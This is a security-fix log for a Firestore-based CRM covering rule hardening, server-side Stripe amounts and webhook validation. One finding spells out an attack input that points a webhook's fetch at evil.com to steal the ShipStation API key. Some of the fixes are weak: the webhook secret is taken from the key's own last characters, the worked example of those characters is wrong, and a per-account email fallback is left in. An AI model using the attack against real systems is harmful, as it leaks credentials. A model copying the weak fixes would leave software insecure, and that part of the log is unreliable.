# SECURITY_FIXES.md — Purpl CRM

Tracking each security fix from FOUNDATION_REVIEW.md.
Each entry: finding → confirmed → what changed → risk of the fix.

---

## SR-1 + SR-3: User self-elevation + catch-all rule

**Confirmed:** Line 15 `allow create` had no field validation — any new Google sign-in could write `{role:'admin'}` to their own user doc. Line 85-86 catch-all `match /{document=**}` granted full CRUD on `portal_tokens`, `portal_config`, and any future collection to any authed user.

**Changed:**
- `firestore.rules` line 24: create rule now requires `!('role' in request.resource.data)` — client can never set role
- `firestore.rules`: removed global catch-all `match /{document=**}`. Default posture is now DENY.
- Added explicit rules for `portal_config` (admin write), `portal_tokens` (admin write)
- Added `isStaff()` helper for future role checks
- `functions/index.js`: added `initUserRole` Cloud Function — uses Admin SDK to create user doc with correct role (first user = admin, subsequent = employee)
- `public/auth.js`: replaced direct Firestore write with `initUserRole` callable

**Risk:** Existing users already have user docs with `role` set — no impact. New users will hit the Cloud Function instead of writing directly. If `initUserRole` fails (deploy not yet done), auth.js falls back to email-based check for graham's account.

---

## SR-2: portal_orders public read

**Confirmed:** Line 41 `allow read: if true` — any unauthenticated user could enumerate all portal orders with customer PII (names, emails, addresses, order items).

**Changed:** `firestore.rules`: `allow read: if request.auth != null` — requires authentication. Create validation (field checks, size limits) retained unchanged.

**Risk:** None. The portal (order.html) never reads portal_orders from the client — it only creates them. All reads happen server-side via Cloud Functions (Admin SDK bypasses rules). The real-time listener in app.js runs under authenticated context.

**Note:** Included in the SR-1+SR-3 commit since it's the same file.

---

## SR-4: audit_log writable by any user

**Confirmed:** `workspace/main/audit_log` fell under `match /workspace/{path=**}` — any authed user could create, modify, or delete audit entries.

**Changed:** Added explicit `match /workspace/main/audit_log/{docId}` with `allow write: if false`. Firestore evaluates the most specific match first, so this blocks all client writes. Admin SDK (Cloud Functions) bypasses rules and can still write.

**Risk:** None. All audit writes already go through Cloud Functions (stripeWebhook, shipStationWebhook). No client-side code writes to audit_log.

**Note:** Included in the SR-1+SR-3 commit.

---

## TB-2: Stripe payment link trusts client-supplied amount

**Confirmed:** `createPayLink` (line 735) and `createStripePaymentLink` (line 788) both used `data.amount` directly as the Stripe `unit_amount`. Any authenticated user could create a $0.50 payment link on a $5,000 invoice, complete payment, and the webhook would mark it fully paid.

**Changed:** Both functions now:
1. Require `data.invoiceId` + `data.invoiceType` instead of `data.amount`
2. Look up the invoice in Firestore using Admin SDK
3. Use `inv.grandTotal || inv.total || inv.amount` as the server-side amount
4. Derive `invoiceNumber` and `accountName` from the server-side record
5. Reject if invoice not found or total < $0.50

The client still sends `amount` in the request but the server ignores it.

**Risk:** Low. The client already sends `invoiceId` and `invoiceType`. The only behavioral change is that the amount is now authoritative from Firestore. If a draft invoice total is $0 (no line items yet), the function returns an error instead of creating a $0 pay link — which is correct behavior.

---

## TB-1: ShipStation webhook credential leak + no authentication

**Confirmed:** `shipStationWebhook` (line 1072) had no caller verification. It fetched `payload.resource_url` with the ShipStation API key in the Authorization header. An attacker could POST `{resource_url: "https://evil.com/steal"}` and receive the API credentials.

**Changed:**
1. **Shared secret check:** Function now requires `?secret=XXXXXXXX` query parameter. The secret is derived from the last 8 characters of `SHIPSTATION_API_KEY`. Requests without a valid secret get 403.
2. **URL origin validation:** `resource_url` must start with `https://ssapi.shipstation.com/`. Any other origin is rejected with 400 before credentials are sent.

Both checks run before any Firestore reads, email sends, or inventory deductions.

**Risk:** Requires updating the ShipStation webhook URL in the ShipStation admin panel to include `?secret=XXXXXXXX` (last 8 chars of your API key). Until this is done, all ShipStation webhooks will be rejected with 403. To get the secret value:
```
# Last 8 chars of your SHIPSTATION_API_KEY value
# e.g., if key is "abc123:xyz789def", secret is "xyz789de" (last 8 of full string)
```
Update in ShipStation → Settings → Stores → Webhook URL: append `?secret=YOUR8CHARS`

